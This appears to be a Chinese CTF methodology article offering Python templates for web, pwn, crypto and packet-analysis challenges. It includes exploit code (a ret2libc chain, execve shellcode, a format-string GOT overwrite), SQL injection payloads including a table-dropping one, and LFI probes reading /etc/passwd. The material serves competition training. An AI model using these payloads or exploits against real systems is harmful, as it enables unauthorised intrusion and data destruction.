---
category: "方法论"
tags: ["Python", "pwntools", "脚本模板", "requests", "自动化"]
difficulty: "中级"
---

# Python脚本模板与常用库

## 1. 概述

Python是CTF竞赛中最常用的自动化语言。在断网离线场景下，所有库必须预先安装。本文提供经过实战验证的Python脚本模板，覆盖Web扫射、Pwn利用、Crypto求解、Reverse辅助等场景，以及pwntools、requests、pycryptodome等核心库的速查用法。

### 核心库速查表

| 库 | 用途 | 导入名 |
|----|------|--------|
| pwntools | 二进制漏洞利用框架 | `from pwn import *` |
| requests | HTTP请求 | `import requests` |
| pycryptodome | 密码学 | `from Crypto.xxx import xxx` |
| gmpy2 | 高精度大数运算 | `import gmpy2` |
| z3-solver | 约束求解/SAT | `from z3 import *` |
| angr | 符号执行 | `import angr` |
| sympy | 符号数学 | `import sympy` |
| scapy | 网络数据包处理 | `from scapy.all import *` |
| beautifulsoup4 | HTML解析 | `from bs4 import BeautifulSoup` |
| paramiko | SSH客户端 | `import paramiko` |
| impacket | Windows协议 | `from impacket import *` |

## 2. 核心原理

### 2.1 pwntools核心架构

pwntools的设计理念是"一切为了快速开发漏洞利用脚本"：

```
pwntools
├── context        # 全局上下文（架构、OS、日志级别）
├── tubes          # 通信管道（进程、远程、串口）
│   ├── process    # 本地进程
│   ├── remote     # 远程连接
│   ├── ssh        # SSH连接
│   └── serial     # 串口通信
├── util           # 工具函数
│   ├── packing    # 打包/解包 (p32, p64, u32, u64)
│   ├── cyclic     # 循环模式生成
│   └── fiddling   # 数据操作
├── elf            # ELF文件解析
├── rop            # ROP链构建
├── shellcraft     # Shellcode生成
├── gdb            # GDB集成调试
└── fmtstr         # 格式化字符串利用
```

### 2.2 requests核心机制

```python
# Session复用TCP连接（大幅提升性能）
session = requests.Session()
session.headers.update({"User-Agent": "CTF-Solver/1.0"})

# 请求-响应完整生命周期
response = session.get(url)
# response.status_code
# response.headers
# response.text (解码后的文本)
# response.content (原始bytes)
# response.json() (JSON解析)
# response.cookies (CookieJar对象)
```

### 2.3 pycryptodome模块组织

```python
from Crypto.Cipher import AES, DES, RSA, PKCS1_OAEP  # 加密算法
from Crypto.Hash import SHA256, MD5, HMAC           # 哈希算法
from Crypto.Protocol.KDF import PBKDF2, scrypt       # 密钥派生
from Crypto.PublicKey import RSA, ECC                # 公钥密码
from Crypto.Util.number import *                     # 数字工具(long_to_bytes等)
from Crypto.Util.Padding import pad, unpad           # 填充
from Crypto.Random import get_random_bytes           # 随机数
```

## 3. 关键技巧/检测方法

### 3.1 通用Web解题脚本模板

```python
#!/usr/bin/env python3
"""
web_solver_template.py - Web题目通用解题模板
支持：多轮请求、Cookie管理、Payload枚举、正则提取
"""

import requests
import re
import sys
import time
from urllib.parse import quote, unquote
from typing import Optional, Dict, List

class WebSolver:
    """Web题目解题器"""
    
    def __init__(self, base_url: str, timeout: int = 10):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,*/*',
        })
    
    def get(self, path: str = '/', **kwargs) -> requests.Response:
        """GET请求"""
        url = f"{self.base_url}{path}"
        return self.session.get(url, timeout=self.timeout, **kwargs)
    
    def post(self, path: str = '/', data=None, json=None, **kwargs) -> requests.Response:
        """POST请求"""
        url = f"{self.base_url}{path}"
        return self.session.post(url, data=data, json=json, timeout=self.timeout, **kwargs)
    
    def extract_flag(self, text: str) -> Optional[str]:
        """从文本中提取flag"""
        patterns = [
            r'flag\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'flag{[^}]+}',
        ]
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(0)
        return None
    
    def test_payloads(self, path: str, param: str, payloads: List[str],
                      method: str = 'get', check_func=None) -> List[dict]:
        """批量测试Payload"""
        results = []
        for i, payload in enumerate(payloads):
            try:
                if method.lower() == 'get':
                    resp = self.get(f"{path}?{param}={quote(payload)}")
                else:
                    resp = self.post(path, data={param: payload})
                
                flag = self.extract_flag(resp.text)
                result = {
                    'index': i,
                    'payload': payload,
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'flag_found': flag
                }
                
                if check_func:
                    result['custom_check'] = check_func(resp)
                
                results.append(result)
                
                if flag:
                    print(f"[!] FLAG FOUND with payload {i}: {flag}")
                    break
                    
            except Exception as e:
                results.append({
                    'index': i,
                    'payload': payload,
                    'error': str(e)
                })
            
            time.sleep(0.1)  # 防止过快请求
        
        return results
    
    def analyze_response(self, resp: requests.Response) -> dict:
        """分析响应"""
        return {
            'status_code': resp.status_code,
            'content_length': len(resp.content),
            'headers': dict(resp.headers),
            'cookies': dict(resp.cookies),
            'redirect_history': [r.url for r in resp.history],
        }

# 使用示例
if __name__ == "__main__":
    solver = WebSolver("http://10.10.10.10:8080")
    
    # 获取首页
    resp = solver.get("/")
    print(f"[*] 首页状态: {resp.status_code}")
    
    # 测试SQL注入Payload
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "1' OR '1'='1",
        "admin' --",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,database()--",
    ]
    
    results = solver.test_payloads(
        path="/login",
        param="username",
        payloads=payloads,
        method="post"
    )
    
    for r in results:
        if r.get('flag_found'):
            print(f"Flag: {r['flag_found']}")
            break
```

### 3.2 pwntools Pwn解题模板

```python
#!/usr/bin/env python3
"""
pwn_solver_template.py - Pwn题目通用解题模板
"""

from pwn import *

# ===== 全局配置 =====
context.arch = 'amd64'          # 目标架构: i386, amd64, arm, mips
context.os = 'linux'            # 目标系统: linux, freebsd, windows
context.log_level = 'debug'     # 日志级别: debug, info, warn, error
context.terminal = ['tmux', 'splitw', '-h']  # GDB终端

# ===== 连接目标 =====
# 本地进程
# p = process('./challenge')
# p = process('./challenge', env={'LD_PRELOAD': './libc.so.6'})

# 远程连接
# p = remote('10.10.10.10', 9999)

# SSH连接
# p = ssh('user', 'host', password='pass', port=22)

# ===== ELF分析 =====
elf = ELF('./challenge')
# elf.symbols['main']        # 函数地址
# elf.got['puts']            # GOT表地址
# elf.plt['system']          # PLT表地址
# elf.search(b'/bin/sh')     # 搜索字符串
# libc = ELF('./libc.so.6')  # 加载libc

# ===== 工具函数 =====
# 打包
# p32(0xdeadbeef)            # 32位小端打包
# p64(0xdeadbeef)            # 64位小端打包
# u32(b'\xef\xbe\xad\xde')   # 32位解包
# u64(b'\xef\xbe\xad\xde')   # 64位解包

# 模式生成（定位偏移）
# cyclic(100)                # 生成100字节循环模式
# cyclic_find(0x6161616c)    # 找到模式的偏移

# ROP
# rop = ROP(elf)
# rop.system(next(elf.search(b'/bin/sh')))
# rop.call('system', [next(elf.search(b'/bin/sh'))])

# ===== 典型利用流程 =====
def pwn_ret2libc():
    """ret2libc攻击模板"""
    
    # 1. 连接
    p = remote('target', 9999)
    
    # 2. 泄漏libc地址
    # 通常通过泄漏GOT表中的函数地址实现
    pop_rdi = 0x4012a3  # ROPgadget找到的pop rdi; ret
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    
    payload = b'A' * 40  # 缓冲区偏移
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(elf.symbols['main'])  # 返回main再次利用
    
    p.sendline(payload)
    
    # 接收泄漏的地址
    p.recvuntil(b'\n')
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    log.info(f'Leaked puts@got: {hex(leak)}')
    
    # 3. 计算libc基址和system地址
    libc = ELF('./libc.so.6')
    libc.address = leak - libc.symbols['puts']
    log.info(f'Libc base: {hex(libc.address)}')
    
    system_addr = libc.symbols['system']
    binsh_addr = next(libc.search(b'/bin/sh'))
    
    # 4. 第二次利用，调用system("/bin/sh")
    payload = b'A' * 40
    payload += p64(pop_rdi + 1)  # ret对齐
    payload += p64(pop_rdi)
    payload += p64(binsh_addr)
    payload += p64(system_addr)
    
    p.sendline(payload)
    p.interactive()

# ===== Shellcode模板 =====
def shellcode_exec():
    """Shellcode执行模板"""
    context.arch = 'amd64'
    
    # 生成shellcode
    # shellcode = asm(shellcraft.sh())          # pwntools内置
    # shellcode = shellcraft.amd64.linux.sh()   # 指定架构
    shellcode = asm('''
        xor rsi, rsi
        push rsi
        mov rdi, 0x68732f2f6e69622f
        push rdi
        push rsp
        pop rdi
        xor edx, edx
        push 0x3b
        pop rax
        syscall
    ''')
    
    log.info(f'Shellcode length: {len(shellcode)} bytes')
    
    # 发送shellcode + 跳转地址
    p = process('./challenge')
    # p.sendline(shellcode)
    p.interactive()

# ===== 格式化字符串利用模板 =====
def fmtstr_exploit():
    """格式化字符串漏洞利用"""
    
    p = process('./challenge')
    
    # 1. 泄漏栈内容找到偏移
    p.sendline(b'%p.' * 20)
    response = p.recv()
    log.info(f'Stack leak: {response}')
    
    # 2. 使用pwntools的fmtstr_payload
    writes = {elf.got['exit']: elf.symbols['win']}  # 将exit@GOT改为win函数
    payload = fmtstr_payload(6, writes, numbwritten=0)
    p.sendline(payload)
    
    p.interactive()

if __name__ == '__main__':
    pwn_ret2libc()
```

### 3.3 Crypto解题脚本模板

```python
#!/usr/bin/env python3
"""
crypto_solver_template.py - 密码学题目通用解题模板
"""

from Crypto.Util.number import *
from Crypto.Cipher import AES
import gmpy2
import sympy
import hashlib
from z3 import *

# ===== 大数工具函数 =====
def int_to_bytes(n: int) -> bytes:
    """大整数转字节"""
    return long_to_bytes(n)

def bytes_to_int(b: bytes) -> int:
    """字节转大整数"""
    return bytes_to_long(b)

# ===== RSA攻击模板集 =====
class RSAAttacks:
    """RSA常见攻击集合"""
    
    @staticmethod
    def factorize_db(n: int):
        """使用factordb本地缓存分解n（需要预下载数据）"""
        # 断网环境下使用本地因子库
        # 可以用 sympy.factorint(n) 或预装的factordb本地文件
        return sympy.factorint(n)
    
    @staticmethod
    def small_e_attack(n: int, e: int, c: int):
        """小指数攻击 (e=3时明文m < n^(1/3))"""
        m, exact = gmpy2.iroot(c, e)
        if exact:
            return int_to_bytes(int(m))
        return None
    
    @staticmethod
    def common_modulus_attack(n: int, e1: int, e2: int, c1: int, c2: int):
        """共模攻击"""
        g, s1, s2 = gmpy2.gcdext(e1, e2)
        if g != 1:
            return None  # e1,e2不互质
        
        if s1 < 0:
            c1 = int(gmpy2.invert(c1, n))
            s1 = -s1
        if s2 < 0:
            c2 = int(gmpy2.invert(c2, n))
            s2 = -s2
        
        m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
        return int_to_bytes(m)
    
    @staticmethod
    def wiener_attack(n: int, e: int, c: int) -> bytes:
        """Wiener攻击（d很小）"""
        # 使用连分数展开
        def continued_fraction(n, d):
            cf = []
            while d:
                q, r = divmod(n, d)
                cf.append(q)
                n, d = d, r
            return cf
        
        def convergents(cf):
            convs = []
            for i in range(len(cf)):
                if i == 0:
                    n, d = cf[0], 1
                elif i == 1:
                    n, d = cf[1] * cf[0] + 1, cf[1]
                else:
                    n = cf[i] * convs[-1][0] + convs[-2][0]
                    d = cf[i] * convs[-1][1] + convs[-2][1]
                convs.append((n, d))
            return convs
        
        cf = continued_fraction(e, n)
        for k, d in convergents(cf):
            if k == 0:
                continue
            phi_n = (e * d - 1) // k
            # 验证
            if (e * d - 1) % k == 0:
                # 尝试解密
                try:
                    m = pow(c, d, n)
                    plain = int_to_bytes(m)
                    # 检查是否包含flag模式
                    if b'flag' in plain.lower() or b'ctf' in plain.lower():
                        return plain
                except:
                    continue
        return None
    
    @staticmethod
    def hastad_broadcast(n_list: list, e: int, c_list: list):
        """Hastad广播攻击（同一明文被e个不同n加密）"""
        assert len(n_list) == len(c_list) == e
        
        # 使用中国剩余定理
        from functools import reduce
        
        def crt(remainders, moduli):
            total = 0
            M = reduce(lambda x, y: x * y, moduli)
            for r, m in zip(remainders, moduli):
                Mi = M // m
                total += r * Mi * int(gmpy2.invert(Mi, m))
            return total % M
        
        m_e = crt(c_list, n_list)
        m, exact = gmpy2.iroot(m_e, e)
        if exact:
            return int_to_bytes(int(m))
        return None

# ===== AES加解密模板 =====
def aes_cbc_decrypt(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """AES-CBC解密"""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(ciphertext)

def aes_ecb_decrypt(key: bytes, ciphertext: bytes) -> bytes:
    """AES-ECB解密"""
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(ciphertext)

def aes_ctr_crypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    """AES-CTR加解密（加密和解密相同）"""
    cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=nonce)
    return cipher.encrypt(data)

# ===== 哈希与HMAC =====
def hash_file(filename: str, algo: str = 'sha256') -> str:
    """计算文件哈希"""
    h = hashlib.new(algo)
    with open(filename, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()

# ===== Z3约束求解模板 =====
def z3_solve_example():
    """Z3约束求解示例"""
    # 创建求解器
    solver = Solver()
    
    # 定义变量
    x = BitVec('x', 32)
    y = BitVec('y', 32)
    
    # 添加约束
    solver.add(x + y == 100)
    solver.add(x * 2 == y)
    solver.add(x > 0)
    solver.add(y > 0)
    
    # 求解
    if solver.check() == sat:
        model = solver.model()
        print(f'x = {model[x].as_long()}')
        print(f'y = {model[y].as_long()}')
    else:
        print('No solution')

# ===== 频率分析破解简单替换密码 =====
def frequency_attack(ciphertext: str) -> str:
    """基于词频的替换密码攻击"""
    from collections import Counter
    
    # 英文字母标准频率（从高到低）
    standard_freq = 'etaoinshrdlcumwfgypbvkjxqz'
    
    # 密文频率
    ciphertext_lower = ciphertext.lower()
    freq = Counter(c for c in ciphertext_lower if c.isalpha())
    sorted_chars = ''.join(c for c, _ in freq.most_common())
    
    # 建立映射
    mapping = {}
    for c, s in zip(sorted_chars, standard_freq):
        mapping[c] = s
        mapping[c.upper()] = s.upper()
    
    # 解密
    plaintext = ''.join(mapping.get(c, c) for c in ciphertext)
    return plaintext

# ===== 完整解题流程示例 =====
if __name__ == '__main__':
    # 读取题目文件
    with open('output.txt', 'r') as f:
        data = f.read()
    
    # 提取n, e, c
    import re
    n = int(re.search(r'n = (\d+)', data).group(1))
    e = int(re.search(r'e = (\d+)', data).group(1))
    c = int(re.search(r'c = (\d+)', data).group(1))
    
    print(f'[*] n bits: {n.bit_length()}')
    print(f'[*] e = {e}')
    
    # 尝试各种攻击
    attacker = RSAAttacks()
    
    # 1. 尝试分解n
    print('[*] 尝试分解n...')
    factors = attacker.factorize_db(n)
    if factors and len(factors) > 1:
        print(f'[+] 分解成功!')
        p, q = list(factors.keys())[:2]
        phi = (p-1) * (q-1)
        d = int(gmpy2.invert(e, phi))
        m = pow(c, d, n)
        print(f'[+] Flag: {int_to_bytes(m)}')
    
    # 2. 尝试小指数攻击
    if e <= 5:
        print('[*] 尝试小指数攻击...')
        result = attacker.small_e_attack(n, e, c)
        if result:
            print(f'[+] Flag: {result}')
```

### 3.4 Scapy网络数据包处理模板

```python
#!/usr/bin/env python3
"""
network_solver_template.py - 网络数据包分析/构造模板
"""

from scapy.all import *

# ===== PCAP文件分析 =====
def analyze_pcap(filepath: str):
    """分析PCAP文件"""
    packets = rdpcap(filepath)
    print(f'[*] 总数据包数: {len(packets)}')
    
    # 按协议统计
    protocols = {}
    for pkt in packets:
        proto = pkt.sprintf('%IP.proto%')
        protocols[proto] = protocols.get(proto, 0) + 1
    
    print('[*] 协议分布:')
    for proto, count in sorted(protocols.items()):
        print(f'    {proto}: {count}')
    
    # 提取通信端点
    endpoints = set()
    for pkt in packets:
        if IP in pkt:
            endpoints.add(pkt[IP].src)
            endpoints.add(pkt[IP].dst)
    
    print(f'[*] 通信端点: {endpoints}')
    
    # 提取TCP流
    tcp_streams = {}
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            key = f'{pkt[IP].src}:{sport} -> {pkt[IP].dst}:{dport}'
            if key not in tcp_streams:
                tcp_streams[key] = b''
            tcp_streams[key] += pkt[Raw].load
    
    # 在每个TCP流中搜索flag
    for key, data in tcp_streams.items():
        if b'flag' in data.lower():
            print(f'[!] 在流中发现flag: {key}')
            print(data.decode('utf-8', errors='replace'))
    
    # 提取DNS查询
    dns_queries = []
    for pkt in packets:
        if DNS in pkt and pkt[DNS].qr == 0:
            dns_queries.append(pkt[DNS].qd.qname.decode())
    
    print(f'[*] DNS查询 ({len(dns_queries)}):')
    for q in set(dns_queries):
        print(f'    {q}')
    
    return packets

# ===== 自定义数据包构造 =====
def craft_packet():
    """构造自定义数据包"""
    # IP+TCP数据包
    pkt = IP(src='10.0.0.1', dst='10.0.0.2') / \
          TCP(sport=12345, dport=80, flags='S') / \
          'GET / HTTP/1.1\r\nHost: target\r\n\r\n'
    
    send(pkt)        # 发送单个包
    # sr1(pkt)       # 发送并等待一个响应
    # sr(pkt)        # 发送并等待所有响应

# ===== 数据提取和重组 =====
def extract_data_from_pcap(filepath: str) -> bytes:
    """从PCAP中提取并重组数据"""
    packets = rdpcap(filepath)
    
    # 提取所有ICMP数据
    icmp_data = b''
    for pkt in packets:
        if ICMP in pkt and Raw in pkt:
            icmp_data += pkt[Raw].load
    
    # 提取DNS隧道数据
    dns_data = b''
    for pkt in packets:
        if DNS in pkt and pkt[DNS].qr == 0:
            qname = pkt[DNS].qd.qname.decode()
            # 提取子域名部分（非正常域名部分）
            if qname.endswith('.exfil.com.'):
                dns_data += bytes.fromhex(qname.split('.')[0])
    
    return icmp_data + dns_data

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        analyze_pcap(sys.argv[1])
    else:
        print('Usage: python3 network_solver_template.py <file.pcap>')
```

### 3.5 离线环境Python工具函数集

```python
#!/usr/bin/env python3
"""
offline_utils.py - 离线环境通用工具函数
"""

import re
import json
import struct
import base64
import itertools
import string
from typing import List, Optional, Tuple

# ===== 编码转换工具 =====
class Encoder:
    """编码转换工具箱"""
    
    @staticmethod
    def b64_encode(data: str) -> str:
        return base64.b64encode(data.encode()).decode()
    
    @staticmethod
    def b64_decode(data: str) -> str:
        return base64.b64decode(data.encode()).decode()
    
    @staticmethod
    def b64_decode_safe(data: str) -> str:
        """安全的Base64解码（自动填充=）"""
        data = data.strip()
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        try:
            return base64.b64decode(data).decode()
        except:
            return base64.b64decode(data).hex()
    
    @staticmethod
    def xor(data: bytes, key: bytes) -> bytes:
        """异或（循环key）"""
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    
    @staticmethod
    def single_byte_xor(data: bytes) -> List[Tuple[int, bytes]]:
        """单字节异或爆破"""
        results = []
        for key in range(256):
            decoded = bytes([b ^ key for b in data])
            # 评分：可打印字符比例
            printable = sum(1 for b in decoded if 32 <= b <= 126)
            score = printable / len(decoded) if len(decoded) > 0 else 0
            results.append((key, decoded, score))
        return sorted(results, key=lambda x: x[2], reverse=True)
    
    @staticmethod
    def rot_n(text: str, n: int) -> str:
        """ROT-N旋转"""
        result = []
        for c in text:
            if 'a' <= c <= 'z':
                result.append(chr((ord(c) - ord('a') + n) % 26 + ord('a')))
            elif 'A' <= c <= 'Z':
                result.append(chr((ord(c) - ord('A') + n) % 26 + ord('A')))
            else:
                result.append(c)
        return ''.join(result)
    
    @staticmethod
    def rot13(text: str) -> str:
        return Encoder.rot_n(text, 13)
    
    @staticmethod
    def morse_decode(text: str) -> str:
        """莫尔斯电码解码"""
        morse_dict = {
            '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D',
            '.': 'E', '..-.': 'F', '--.': 'G', '....': 'H',
            '..': 'I', '.---': 'J', '-.-': 'K', '.-..': 'L',
            '--': 'M', '-.': 'N', '---': 'O', '.--.': 'P',
            '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
            '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X',
            '-.--': 'Y', '--..': 'Z',
            '.----': '1', '..---': '2', '...--': '3',
            '....-': '4', '.....': '5', '-....': '6',
            '--...': '7', '---..': '8', '----.': '9',
            '-----': '0'
        }
        words = text.split(' / ')
        result = []
        for word in words:
            chars = word.split()
            result.append(''.join(morse_dict.get(c, '?') for c in chars))
        return ' '.join(result)

# ===== 文件分析工具 =====
class FileAnalyzer:
    """文件分析工具箱"""
    
    @staticmethod
    def is_png_corrupted(filepath: str) -> Optional[str]:
        """检查PNG文件是否损坏"""
        with open(filepath, 'rb') as f:
            data = f.read()
        
        issues = []
        # 检查头部
        if data[:8] != b'\x89PNG\r\n\x1a\n':
            issues.append('PNG签名缺失或损坏')
        # 检查尾部
        if data[-12:] != b'\x00\x00\x00\x00IEND\xaeB\x60\x82':
            issues.append('IEND块缺失或损坏')
        # 检查IHDR
        if b'IHDR' not in data[:33]:
            issues.append('IHDR块缺失')
        
        return '; '.join(issues) if issues else None
    
    @staticmethod
    def extract_zip_comment(filepath: str) -> bytes:
        """提取ZIP文件注释"""
        with open(filepath, 'rb') as f:
            data = f.read()
        # ZIP文件尾的End of Central Directory记录
        eocd_offset = data.rfind(b'PK\x05\x06')
        if eocd_offset != -1:
            comment_len = struct.unpack('<H', data[eocd_offset+20:eocd_offset+22])[0]
            return data[eocd_offset+22:eocd_offset+22+comment_len]
        return b''
    
    @staticmethod
    def binary_diff(file1: str, file2: str) -> List[Tuple[int, int, int]]:
        """比较两个二进制文件的不同"""
        with open(file1, 'rb') as f:
            data1 = f.read()
        with open(file2, 'rb') as f:
            data2 = f.read()
        
        diffs = []
        max_len = max(len(data1), len(data2))
        for i in range(max_len):
            b1 = data1[i] if i < len(data1) else None
            b2 = data2[i] if i < len(data2) else None
            if b1 != b2:
                diffs.append((i, b1, b2))
        return diffs

# ===== 密码破解工具 =====
class PasswordCracker:
    """密码破解辅助工具"""
    
    @staticmethod
    def generate_wordlist(base_words: List[str], leet_rules: bool = True) -> List[str]:
        """基于基础词生成扩展词表"""
        words = set(base_words)
        
        for word in base_words:
            # 大小写变换
            words.add(word.lower())
            words.add(word.upper())
            words.add(word.capitalize())
            
            # 常见后缀
            for suffix in ['123', '1234', '12345', '!', '@', '#', '2024', '2023']:
                words.add(word + suffix)
            
            # Leet speak变换
            if leet_rules:
                leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
                leet_word = ''.join(leet_map.get(c.lower(), c) for c in word)
                if leet_word != word:
                    words.add(leet_word)
        
        return sorted(words)
    
    @staticmethod
    def build_sql_injection_wordlist() -> List[str]:
        """生成SQL注入常见Payload"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR 1=1#",
            "') OR ('1'='1",
            '" OR "1"="1',
            '" OR "1"="1" --',
            "1; DROP TABLE users",
            "1' WAITFOR DELAY '00:00:05'--",
        ]
        # 生成编码变体
        from urllib.parse import quote
        all_payloads = list(payloads)
        for p in payloads:
            all_payloads.append(quote(p))
        
        return all_payloads

if __name__ == '__main__':
    print('[*] 离线工具函数集已加载')
    print('    Encoder: 编码转换工具')
    print('    FileAnalyzer: 文件分析工具')
    print('    PasswordCracker: 密码破解工具')
```

## 4. 常见误区与注意事项

### 4.1 常见错误

| 错误 | 后果 | 正确做法 |
|------|------|----------|
| 未设置pwntools context | 架构错误导致利用失败 | `context.arch = 'amd64'` 等配置 |
| bytes/str混用 | Python3中类型错误 | 明确区分b'a'和'a' |
| 忘记URL编码Payload | 特殊字符被截断 | 使用`urllib.parse.quote()` |
| 未处理超时异常 | 脚本卡死 | 设置timeout和try/except |
| 使用requests未复用Session | 每次重新TCP握手，速度慢 | 使用`requests.Session()` |
| Crypto库版本不匹配 | API变化导致代码报错 | 离线环境锁定已知版本 |
| 大数运算使用Python int | 性能差 | 使用gmpy2.mpz |
| 忘记关闭连接 | 资源泄露 | 使用`with`语句或显式关闭 |

### 4.2 断网环境Python编码原则

1. **用try/except包裹所有可能在离线环境失败的操作**（如DNS解析、网络连接）
2. **依赖检查前置**：脚本开始时检查所有需要的库是否可用
3. **自给自足**：每个脚本的依赖尽可能少，避免深层依赖链
4. **使用绝对导入**：`from pwn import *` 而非动态导入
5. **Python版本锁定**：脚本标注所需Python版本（3.8/3.11等）

## 5. 实战示例

### 示例1：完整Web题目自动化解题

```python
#!/usr/bin/env python3
"""自动化Web题目解题流程：从扫描到获取flag"""

import requests
import re
import sys
import time

BASE_URL = "http://10.10.10.10"

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0',
})

def solve():
    print("[*] Step 1: 信息收集")
    resp = session.get(f"{BASE_URL}/")
    print(f"    状态: {resp.status_code}, 长度: {len(resp.text)}")
    
    # 检查响应头
    for header, value in resp.headers.items():
        print(f"    {header}: {value}")
    
    # 检查隐藏信息
    for pattern in [r'<!--(.*?)-->', r'flag\{[^}]+\}']:
        matches = re.findall(pattern, resp.text, re.DOTALL)
        for m in matches:
            print(f"[!] 发现: {m}")
    
    print("[*] Step 2: 目录扫描（使用本地小词表）")
    dirs = ['admin', 'backup', '.git', 'api', 'debug', 'test', 'config']
    for d in dirs:
        try:
            r = session.get(f"{BASE_URL}/{d}/", timeout=3)
            if r.status_code != 404:
                print(f"    [{r.status_code}] /{d}/")
        except:
            pass
    
    print("[*] Step 3: 漏洞测试")
    # 测试文件包含
    for path in [
        '/index.php?page=../../etc/passwd',
        '/index.php?file=../../etc/passwd',
        '/?page=php://filter/convert.base64-encode/resource=index',
    ]:
        r = session.get(f"{BASE_URL}{path}")
        if 'root:' in r.text or 'bin/' in r.text:
            print(f"[!] LFI漏洞发现: {path}")
        if r.status_code == 200 and len(r.text) < 10000:
            print(f"    [{r.status_code}] {path} -> {r.text[:100]}")
    
    print("[*] Step 4: 提取flag")
    # 在所有响应中搜索flag
    final = session.get(f"{BASE_URL}/")
    match = re.search(r'flag\{[^}]+\}', final.text)
    if match:
        flag = match.group(0)
        print(f"[+] FLAG FOUND: {flag}")
        return flag
    
    print("[-] 未找到flag")
    return None

if __name__ == "__main__":
    flag = solve()
    if flag:
        sys.exit(0)
    else:
        sys.exit(1)
```

## 6. 相关知识点

- [02-离线环境搭建与工具预装策略](./02-离线环境搭建与工具预装策略.md) - Python库的离线安装
- [04-给AI小模型的提示词工程](./04-给AI小模型的提示词工程.md) - 用AI生成和调试Python脚本
- [05-Linux命令行速查与高级技巧](./05-Linux命令行速查与高级技巧.md) - Shell与Python的配合
- [10-编码与进制转换速查](./10-编码与进制转换速查.md) - 编码处理库
- [12-密码学数学基础速查](./12-密码学数学基础速查.md) - Crypto脚本的数学基础
